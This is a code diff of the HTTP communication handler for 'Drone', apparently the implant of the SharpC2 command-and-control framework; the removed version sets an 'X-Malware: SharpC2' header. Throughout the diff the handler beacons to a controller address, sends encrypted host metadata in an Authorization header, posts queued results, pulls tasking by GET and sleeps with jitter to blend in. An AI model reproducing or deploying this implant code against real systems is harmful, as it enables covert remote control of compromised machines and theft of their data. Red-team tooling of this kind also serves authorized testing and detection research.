@@ -1,126 +1,106 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net;
+using System.Threading;
 using System.Threading.Tasks;
 
 using Drone.Models;
+using Drone.Utilities;
 
-namespace Drone.Handlers
+namespace Drone.Handlers;
+
+public class HttpHandler : Handler
 {
-    public class HttpHandler : Handler
+    private readonly string _connectAddress;
+    private readonly int _connectPort;
+
+    private WebClient _client;
+
+    private bool _running;
+    
+    public HttpHandler(string connectAddress, int connectPort)
     {
-        private WebClient _client;
-        private bool _running;
-        private int _retryNumber;
-
-        public override void Init(DroneConfig config, Metadata metadata)
-        {
-            base.Init(config, metadata);
-
-            _client = new WebClient {BaseAddress = $"{HttpScheme}://{ConnectAddress}:{ConnectPort}"};
-            _client.Headers.Clear();
-
-            var encodedMetadata = Convert.ToBase64String(Crypto.EncryptData(Metadata));
-            _client.Headers.Add("X-Malware", "SharpC2");
-            _client.Headers.Add("Authorization", $"Bearer {encodedMetadata}");
-        }
-
-        public override async Task Start(string[] args = null)
-        {
-            _running = true;
-
-            while (_running)
-            {
-                try
-                {
-                    await CheckIn();
-                    _retryNumber = 0;  // if successful, ensure retry number is set to 0
-                }
-                catch
-                {
-                    _retryNumber++;
-                    if (_retryNumber > 10) return;
-
-                    var backoffTime = _backoff[_retryNumber];
-                    await Task.Delay(backoffTime * 1000);
-                    
-                    continue;
-                }
-
-                var interval = Config.GetConfig<int>("SleepInterval");
-                var jitter = Config.GetConfig<int>("SleepJitter");
-                var sleep = CalculateSleepTime(interval, jitter);
-
-                await Task.Delay(sleep * 1000);
-            }
-        }
-
-        private static int CalculateSleepTime(int interval, int jitter)
-        {
-            var diff = (int)Math.Round((double)interval / 100 * jitter);
-
-            var min = interval - diff;
-            var max = interval + diff;
-
-            var rand = new Random();
-            return rand.Next(min, max);
-        }
-
-        private async Task CheckIn()
-        {
-            if (OutboundQueue.IsEmpty) await SendGet();
-            else await SendPost();
-        }
-
-        private async Task SendGet()
-        {
-            var response = await _client.DownloadDataTaskAsync("/");
-            
-            HandleResponse(response);
-        }
-
-        private async Task SendPost()
-        {
-            var data = GetOutboundQueue().Serialize();
-            var response = await _client.UploadDataTaskAsync("/", data);
-            
-            HandleResponse(response);
-        }
-
-        private void HandleResponse(byte[] response)
-        {
-            if (response.Length == 0) return;
-
-            var envelopes = response.Deserialize<MessageEnvelope[]>();
-            if (!envelopes.Any()) return;
-
-            foreach (var envelope in envelopes)
-                InboundQueue.Enqueue(envelope);
-        }
-
-        public override void Stop()
-        {
-            _running = false;
-            _client.Dispose();
-        }
-
-        private readonly Dictionary<int, int> _backoff = new()
-        {
-            { 1, 2 },      // 2 seconds
-            { 2, 30 },     // 30 seconds
-            { 3, 60 },     // 1 minute
-            { 4, 300 },    // 5 minutes
-            { 5, 600 },    // 10 minutes
-            { 6, 900 },    // 15 minutes
-            { 7, 1800 },   // 30 minutes
-            { 8, 3600 },   // 60 minutes
-            { 9, 43200 },  // 12 hours
-            { 10, 86400 }  // 24 hours
-        };
-
-        private static string HttpScheme => "http";
-        private static string ConnectAddress => "localhost";
-        private static string ConnectPort => "80";
+        _connectAddress = connectAddress;
+        _connectPort = connectPort;
     }
+    
+    public override async Task Start()
+    {
+        _client = new WebClient();
+        _client.BaseAddress = $"http://{_connectAddress}:{_connectPort}";
+        _client.Headers.Clear();
+
+        var enc = Crypto.EncryptObject(Metadata);
+        var buf = enc.ToByteArray(); 
+
+        _client.Headers.Add("Authorization", $"Bearer {Convert.ToBase64String(buf)}");
+        
+        _running = true;
+
+        while (_running)
+        {
+            if (GetOutbound(out var outbound))
+            {
+                // send outbound messages in a POST
+                await Post(outbound).ContinueWith(HandleResponse);
+            }
+            else
+            {
+                // otherwise, just do a GET
+                await CheckIn().ContinueWith(HandleResponse);
+            }
+            
+            var interval = Config.Get<int>("SleepInterval");
+            var jitter = Config.Get<int>("SleepJitter");
+            var sleep = CalculateSleepTime(interval, jitter);
+            
+            Thread.Sleep(sleep * 1000);
+        }
+    }
+    
+    private static int CalculateSleepTime(int interval, int jitter)
+    {
+        var diff = (int)Math.Round((double)interval / 100 * jitter);
+
+        var min = interval - diff;
+        var max = interval + diff;
+
+        var rand = new Random();
+        return rand.Next(min, max);
+    }
+
+    private async Task<byte[]> CheckIn()
+    {
+        return await _client.DownloadDataTaskAsync(Endpoint);
+    }
+
+    private async Task<byte[]> Post(C2Message outbound)
+    {
+        var raw = outbound.Serialize();
+        return await _client.UploadDataTaskAsync(Endpoint, raw);
+    }
+
+    private void HandleResponse(Task<byte[]> data)
+    {
+        try
+        {
+            var response = data.Result;
+        
+            if (response is null || response.Length == 0)
+                return;
+
+            var message = response.Deserialize<C2Message>();
+            QueueInbound(message);
+        }
+        catch
+        {
+            // swallow exceptions
+        }
+    }
+
+    public override void Stop()
+    {
+        _running = false;
+    }
+
+    private static string Endpoint => "/index.html";
 }
